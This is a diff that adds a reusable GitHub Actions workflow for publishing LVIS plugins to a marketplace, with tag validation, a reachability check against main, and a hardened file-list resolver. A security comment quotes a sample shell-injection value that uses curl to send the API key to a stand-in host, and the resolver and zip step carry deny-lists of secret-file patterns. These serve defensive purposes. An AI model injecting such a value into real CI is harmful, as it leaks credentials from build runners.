@@ -1,0 +1,418 @@
+name: marketplace-publish (reusable)
+#
+# Reusable workflow for publishing an LVIS plugin to the marketplace.
+# Replaces the per-plugin `publish.yml` files that drifted across repos
+# (cf. lvis-plugin-local-indexer worker / lockfile regression chain on
+# v0.1.20–0.1.21). With this single source of truth, future changes
+# to the publish pipeline (security guards, marketplace API contract,
+# zip layout) land once and propagate to every plugin via the
+# `uses: lvis-project/.github/.github/workflows/marketplace-publish.yml@vN`
+# reference in their thin caller workflow.
+#
+# Trigger model: a SemVer git tag (`vMAJOR.MINOR.PATCH`) is the **single
+# source of truth** for a release. The plugin author bumps `plugin.json`'s
+# `version` field, lands it on `main`, and pushes a matching tag — that
+# tag-push is the only thing the caller workflows listen to. Branch pushes
+# do NOT publish.
+#
+# This replaces the previous flow where `bump_version.py` derived the
+# next version from `marketplace catalog + 1` inside CI. That made the
+# marketplace the de facto SoT and source `plugin.json` drifted (e.g.
+# 0.1.22 in catalog vs 0.1.0 on main), causing sideloaded installs to
+# surface a misleading "업데이트 있음" banner. With tag-as-SoT, source
+# manifest and catalog never diverge — sideload and marketplace install
+# share the same plugin.json layout (install-receipt fields like
+# `installSource` / `signerKeyId` still differ).
+
+on:
+  workflow_call:
+    inputs:
+      slug:
+        description: "Plugin slug (catalog id, e.g. 'meeting', 'local-indexer'). Must equal plugin.json.id."
+        type: string
+        required: true
+    secrets:
+      MARKETPLACE_API_KEY:
+        description: "Bearer token for marketplace POST /versions endpoint."
+        required: true
+      MARKETPLACE_BASE_URL:
+        description: "Marketplace base URL. Defaults to https://marketplace.lvisai.xyz when unset."
+        required: false
+
+jobs:
+  publish:
+    runs-on: [self-hosted, linux, arm64, oracle]
+    permissions:
+      contents: read
+    env:
+      BUN_INSTALL: /tmp/lvis-bun-${{ github.run_id }}-${{ github.run_attempt }}-${{ github.job }}
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          # Need full history so `git merge-base --is-ancestor` can verify the
+          # tagged commit is reachable from origin/main.
+          fetch-depth: 0
+
+      - name: Resolve + validate release version
+        # Validation runs BEFORE bun install / build so a malformed tag
+        # fails in seconds instead of waiting through ~minutes of CI.
+        # The tag is parsed as `v<semver>`; that semver string MUST equal
+        # `plugin.json`'s `version` field. Mismatch fails fast.
+        env:
+          PLUGIN_SLUG: ${{ inputs.slug }}
+        run: |
+          if [[ "$GITHUB_REF" != refs/tags/v* ]]; then
+            echo "::error::publish must be triggered from a v*.*.* tag (got $GITHUB_REF). To release, bump plugin.json's version on main, then 'git tag vX.Y.Z && git push origin vX.Y.Z'."
+            exit 1
+          fi
+          TAG_VER="${GITHUB_REF#refs/tags/v}"
+          # Strict SemVer regex — rejects v..  / v1.2.foo / v1.2.3-rc1 etc.
+          # Each component disallows leading zeros per SemVer §2 (`01.2.3`
+          # would otherwise be a distinct catalog entry from `1.2.3`).
+          # Pre-release tags need explicit support (and a separate channel
+          # decision); for now stable-only.
+          if ! [[ "$TAG_VER" =~ ^(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)$ ]]; then
+            echo "::error::tag must be vMAJOR.MINOR.PATCH SemVer with no leading zeros (got v$TAG_VER)"
+            exit 1
+          fi
+          # Type-strict manifest version read. Without this, a non-string
+          # `version` (null/numeric/object) would silently coerce to "" via
+          # `|| ""` and surface as a misleading "missing version" error.
+          # Node exits non-zero on type mismatch; the `if !` form guarantees
+          # we observe that exit even inside `$(...)` (set -e doesn't always
+          # propagate command-substitution failures cleanly).
+          if ! MANIFEST_VER=$(node -e '
+            const m = require("./plugin.json");
+            const v = m.version;
+            if (typeof v !== "string" || v.length === 0) {
+              console.error("plugin.json.version must be a non-empty string");
+              process.exit(2);
+            }
+            process.stdout.write(v);
+          '); then
+            echo "::error::failed to read plugin.json version (missing/non-string/invalid JSON)"
+            exit 1
+          fi
+          if [ "$TAG_VER" != "$MANIFEST_VER" ]; then
+            echo "::error::tag v$TAG_VER does not match plugin.json version $MANIFEST_VER — bump plugin.json on main BEFORE pushing the tag"
+            exit 1
+          fi
+          # Defense-in-depth: cross-check that the caller-provided slug
+          # matches `plugin.json.id`. A drift here would publish under a
+          # different catalog entry than the manifest declares — silent
+          # corruption. Fail-closed.
+          if ! MANIFEST_ID=$(node -e '
+            const m = require("./plugin.json");
+            const id = m.id;
+            if (typeof id !== "string" || id.length === 0) {
+              console.error("plugin.json.id must be a non-empty string");
+              process.exit(2);
+            }
+            process.stdout.write(id);
+          '); then
+            echo "::error::failed to read plugin.json id"
+            exit 1
+          fi
+          if [ "$PLUGIN_SLUG" != "$MANIFEST_ID" ]; then
+            echo "::error::caller-provided slug '$PLUGIN_SLUG' does not match plugin.json.id '$MANIFEST_ID' — fix the caller's 'with: slug:' input"
+            exit 1
+          fi
+          echo "Publishing $PLUGIN_SLUG @ $TAG_VER"
+          echo "PLUGIN_VERSION=$TAG_VER" >> "$GITHUB_ENV"
+
+      - name: Verify tag commit is reachable from origin/main
+        # Defense-in-depth: only allow tags that point at main-merged commits.
+        # Stops `git tag v9.9.9 <off-main-sha> && git push --tags` from
+        # publishing arbitrary repo history. Cheap reachability check on the
+        # full-depth checkout fetched above.
+        #
+        # Boundary: this check proves the tag points at a commit reachable
+        # from `origin/main` HEAD at workflow runtime. It does NOT defend
+        # against `main` itself being compromised (force-push, malicious
+        # merge, etc.). Those vectors are gated by GitHub branch protection
+        # on `main` (required reviews, force-push disabled). This workflow
+        # assumes that gate is in place; re-verify with
+        # `gh api repos/.../branches/main/protection` if branch protection
+        # configuration changes.
+        run: |
+          git fetch origin main --quiet
+          if ! git merge-base --is-ancestor "$GITHUB_SHA" origin/main; then
+            echo "::error::tag commit $GITHUB_SHA is not reachable from origin/main — only main-merged commits may be released"
+            exit 1
+          fi
+
+      - uses: oven-sh/setup-bun@v2
+      - run: bun install --frozen-lockfile
+      - run: bun run build
+
+      - name: Normalize marketplace URL
+        env:
+          MARKETPLACE_BASE_URL: ${{ secrets.MARKETPLACE_BASE_URL }}
+        run: |
+          base="${MARKETPLACE_BASE_URL:-https://marketplace.lvisai.xyz}"
+          base="${base%/}"
+          base="${base%/api/v1}"
+          echo "MARKETPLACE_BASE_URL=$base" >> "$GITHUB_ENV"
+
+      - name: Resolve shippable file list from package.json:files
+        id: filelist
+        # Source of truth for what reaches the marketplace artifact lives
+        # in `package.json:files[]` — same place npm/bun look. Reading it
+        # here ensures that adding a new shippable directory (e.g.
+        # `python-requirements.lock`, `assets/`, ...) just requires the
+        # plugin author to update `files[]`; no parallel edit to this
+        # workflow needed. Pre-fix this list was hardcoded as
+        # `plugin.json + dist/` and authors silently dropped declared
+        # entries (cf. lvis-plugin-local-indexer worker dir + lockfile
+        # regression on v0.1.20/0.1.21).
+        #
+        # `plugin.json` is force-included even if absent from `files[]`
+        # because the marketplace API requires it as the manifest entry
+        # and treating it as optional invites accidental drop.
+        #
+        # SECURITY:
+        # - The list is written to `$RUNNER_TEMP/artifact-files.list` (one
+        #   path per line) and consumed via `zip -@` (stdin file list),
+        #   NOT injected into the shell command via `${{ }}` substitution
+        #   — that pattern is a documented GitHub Actions code-injection
+        #   sink (an attacker landing a `files[]` entry like
+        #   `"x; curl evil.example/$MARKETPLACE_API_KEY"` would otherwise
+        #   exec shell on a self-hosted runner).
+        # - Glob patterns are rejected explicitly (instead of confusingly
+        #   failing the missing-on-disk check).
+        # - Symlinks pointing outside the repo root are rejected so
+        #   `dist/leak -> /etc/passwd` can't ship.
+        # - A small deny-list (`.env`, `.pem`, `.git/`, ...) blocks
+        #   accidental sensitive-file inclusion. Defense-in-depth — the
+        #   `zip -x` excludes also catch these but the resolver fails
+        #   loudly so the author sees the mistake.
+        # - `package.json:files[]` is trusted because the workflow only
+        #   runs on tags reachable from origin/main, gated by branch
+        #   protection — see "tag commit reachable from origin/main"
+        #   step above.
+        run: |
+          node -e '
+            const fs = require("node:fs");
+            const path = require("node:path");
+            const os = require("node:os");
+            const m = require("./package.json");
+            const declared = Array.isArray(m.files) ? m.files : [];
+            const set = new Set(declared);
+            const pluginJsonAutoAdded = !set.has("plugin.json");
+            set.add("plugin.json");
+
+            const GLOB_CHARS = /[*?\[\]]/;
+            // Boundary-anchored to avoid over-rejecting legitimate names like
+            // `.envoy.config`, `secrets-overview.md`. Each pattern targets
+            // exactly the sensitive-file convention (e.g. `.env`, `.env.local`,
+            // `.env.production`) while letting `.envoy*` through.
+            const SECRET_PATTERNS = [
+              /(^|\/)\.env($|\.|\/)/,
+              /(^|\/)id_rsa($|\.)/,
+              /(^|\/)\.git\//,
+              /(^|\/)\.github\//,
+              /(^|\/)\.npmrc$/,
+              /(^|\/)\.netrc$/,
+              /(^|\/)secrets($|\.|\/)/i,
+              /\.pem$/,
+              /\.key$/,
+            ];
+
+            const root = path.resolve(".");
+            const present = [];
+            const missing = [];
+            const errors = [];
+
+            for (const entry of set) {
+              if (typeof entry !== "string" || entry.length === 0) {
+                errors.push("non-string entry in files[]: " + JSON.stringify(entry));
+                continue;
+              }
+              // Segment-aware traversal check: split on / and \ and reject
+              // exactly the `..` segment. Substring `entry.includes("..")`
+              // would over-reject legitimate filenames like `foo..bar`,
+              // `..gitkeep`. Combined with `path.isAbsolute` for the
+              // absolute-path escape vector.
+              const segs = entry.split(/[/\\]/);
+              if (segs.includes("..") || path.isAbsolute(entry)) {
+                errors.push("entry escapes repo root: " + entry);
+                continue;
+              }
+              if (GLOB_CHARS.test(entry)) {
+                errors.push("glob patterns not supported (use directory or file path): " + entry);
+                continue;
+              }
+              if (SECRET_PATTERNS.some(re => re.test(entry))) {
+                errors.push("sensitive-file pattern blocked: " + entry);
+                continue;
+              }
+              let stat;
+              try {
+                stat = fs.lstatSync(entry);
+              } catch {
+                missing.push(entry);
+                continue;
+              }
+              // realpathSync on every entry (not just symlinks) catches
+              // directory-symlink-then-regular-file traversal (e.g.
+              // `dist/link/file` where `dist/link -> /etc`). Defense-in-depth
+              // even though the segment check above + zip --symlinks already
+              // narrow the surface.
+              let real;
+              try {
+                real = fs.realpathSync(entry);
+              } catch {
+                // Either a broken symlink, a permission/TOCTOU race, or
+                // the entry vanished between lstatSync and realpathSync.
+                // Either way, refuse to ship rather than guess.
+                errors.push("entry path unresolvable (broken symlink or race): " + entry);
+                continue;
+              }
+              if (real !== root && !real.startsWith(root + path.sep)) {
+                errors.push("entry resolves outside repo root: " + entry + " -> " + real);
+                continue;
+              }
+              present.push(entry);
+            }
+
+            if (errors.length > 0) {
+              for (const e of errors) console.error("publish: " + e);
+              process.exit(1);
+            }
+            if (missing.length > 0) {
+              console.error("publish: declared but missing on disk: " + missing.join(", "));
+              process.exit(1);
+            }
+
+            // Use os.tmpdir() as fallback so the resolver works portably (act
+            // local dev, non-Linux runners). Both this step and the consumer
+            // step (zip -@) read $RUNNER_TEMP — the env-var stays the source
+            // of truth on real CI; fallback only triggers off-Actions.
+            const listPath = path.join(process.env.RUNNER_TEMP || os.tmpdir(), "artifact-files.list");
+            fs.writeFileSync(listPath, present.join("\n") + "\n");
+            console.log("publish: " + present.length + " entries -> " + listPath);
+            for (const p of present) console.log("  " + p);
+            if (pluginJsonAutoAdded) {
+              // Print as a GitHub workflow ::warning:: so the author sees a
+              // banner on the run summary, but do not fail — the marketplace
+              // requires plugin.json so auto-include is the right behaviour.
+              console.log("::warning::publish: plugin.json was missing from package.json:files[] — auto-included. Consider adding it explicitly.");
+            }
+          '
+
+      - name: Package + publish
+        id: publish
+        env:
+          MARKETPLACE_API_KEY: ${{ secrets.MARKETPLACE_API_KEY }}
+          PLUGIN_SLUG: ${{ inputs.slug }}
+          # Tag-push events have no head_commit; reach for the tagged commit's
+          # message via git so the marketplace audit chip still gets real data.
+          COMMIT_URL: ${{ format('{0}/{1}/commit/{2}', github.server_url, github.repository, github.sha) }}
+        run: |
+          COMMIT_MESSAGE="$(git log -1 --pretty=%B "${{ github.sha }}")"
+          # File list comes from stdin via `zip -@` — see the resolver
+          # step above for the security rationale (no `${{ }}` shell
+          # injection sink, names with whitespace / quotes safe).
+          # `--symlinks` stores symlinks rather than dereferencing
+          # (defense-in-depth — the resolver already rejects external
+          # symlinks). The `-x` excludes are size hygiene
+          # (`*.map` / `node_modules/*`) plus a sensitive-file deny
+          # mirroring the resolver's pattern list (defense-in-depth).
+          zip -r --symlinks plugin.zip -@ \
+            -x "*.map" \
+            -x "node_modules/*" \
+            -x "*.env*" \
+            -x "*.pem" \
+            -x "*.key" \
+            -x "id_rsa*" \
+            -x ".git/*" \
+            -x ".github/*" \
+            -x "*.npmrc" \
+            -x "*.netrc" \
+            -x "secrets*" \
+            < "$RUNNER_TEMP/artifact-files.list"
+          response="$(mktemp)"
+          status=$(curl -sS -o "$response" -w "%{http_code}" -X POST "${MARKETPLACE_BASE_URL}/api/v1/plugins/${PLUGIN_SLUG}/versions" \
+            -H "Authorization: Bearer ${MARKETPLACE_API_KEY}" \
+            -F "commit_hash=${{ github.sha }}" \
+            --form-string "commit_message=$COMMIT_MESSAGE" \
+            -F "commit_url=$COMMIT_URL" \
+            -F "file=@plugin.zip")
+          cat "$response"
+          if [ "$status" = "201" ]; then
+            echo "Published ${PLUGIN_SLUG} @ ${PLUGIN_VERSION}"
+            echo "outcome=published" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          if [ "$status" = "409" ] && grep -Eiq "already (exists|published)|not (strictly )?greater|duplicate version" "$response"; then
+            # 409 is ambiguous — could be "exact same artifact already
+            # published (idempotent retry)", "tag rewritten to a different
+            # commit", or "stale tag below catalog latest". Defer to the
+            # next step which queries the catalog and either succeeds
+            # (matching sha → idempotent) or fails loud.
+            echo "::warning::${PLUGIN_SLUG} @ ${PLUGIN_VERSION} got 409 — running idempotent re-publish verification"
+            echo "outcome=needs-verify" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          echo "::error::Marketplace publish failed with HTTP $status"
+          exit 1
+
+      - name: Verify idempotent 409 against catalog commit_hash
+        # Compares the catalog's `latest_commit_hash` for this slug against
+        # the workflow's `${{ github.sha }}` to distinguish a benign
+        # idempotent retry from a malicious tag rewrite. Fail-closed: any
+        # case where the catalog doesn't surface a matching `commit_hash`
+        # for our PLUGIN_VERSION (slug missing, latest is a different
+        # version, commit_hash field missing) is treated as an error.
+        #
+        # Workaround note: the catalog summary exposes `latest_*` only.
+        # A per-version `GET /plugins/{slug}/versions/{version}` route
+        # would let us compare any version, not just latest. Tracked as a
+        # follow-up issue against lvis-marketplace; until then this step
+        # only handles the common case (publish 409 because the version
+        # we tried IS the catalog latest).
+        if: steps.publish.outputs.outcome == 'needs-verify'
+        # No Authorization header — the catalog endpoint is public read,
+        # so we don't unnecessarily expose MARKETPLACE_API_KEY here.
+        env:
+          PLUGIN_SLUG: ${{ inputs.slug }}
+        run: |
+          catalog_response=$(mktemp)
+          catalog_status=$(curl -sS -o "$catalog_response" -w "%{http_code}" \
+            "${MARKETPLACE_BASE_URL}/api/v1/catalog")
+          if [ "$catalog_status" != "200" ]; then
+            echo "::error::failed to GET catalog (HTTP $catalog_status) — cannot verify idempotent re-publish"
+            cat "$catalog_response"
+            exit 1
+          fi
+          PYOUT=$(PLUGIN_VERSION="$PLUGIN_VERSION" PLUGIN_SLUG="$PLUGIN_SLUG" python3 - "$catalog_response" <<'PY'
+          import json, os, sys
+          with open(sys.argv[1]) as f:
+            items = json.load(f)
+          slug = os.environ["PLUGIN_SLUG"]
+          for p in items:
+            if p.get("slug") == slug:
+              print(p.get("latest_stable_version", ""))
+              print(p.get("latest_commit_hash", ""))
+              sys.exit(0)
+          PY
+          )
+          catalog_latest=$(echo "$PYOUT" | sed -n '1p')
+          catalog_sha=$(echo "$PYOUT" | sed -n '2p')
+          if [ -z "$catalog_latest" ]; then
+            echo "::error::${PLUGIN_SLUG} not found in catalog after 409 — refusing to silently succeed"
+            exit 1
+          fi
+          if [ "$catalog_latest" != "$PLUGIN_VERSION" ]; then
+            echo "::error::tag v${PLUGIN_VERSION} got 409 but catalog latest is v${catalog_latest} (not the version we tried to publish). Bump plugin.json above v${catalog_latest} and use a new tag."
+            exit 1
+          fi
+          if [ -z "$catalog_sha" ]; then
+            echo "::error::tag v${PLUGIN_VERSION} matches catalog latest but commit_hash not surfaced — refusing to silently succeed"
+            exit 1
+          fi
+          if [ "$catalog_sha" != "${{ github.sha }}" ]; then
+            echo "::error::tag v${PLUGIN_VERSION} was already published from $catalog_sha — refusing silent re-publish from ${{ github.sha }}. Bump plugin.json + use a new tag."
+            exit 1
+          fi
+          echo "Idempotent retry — catalog already holds v${PLUGIN_VERSION} from matching sha ${catalog_sha}"
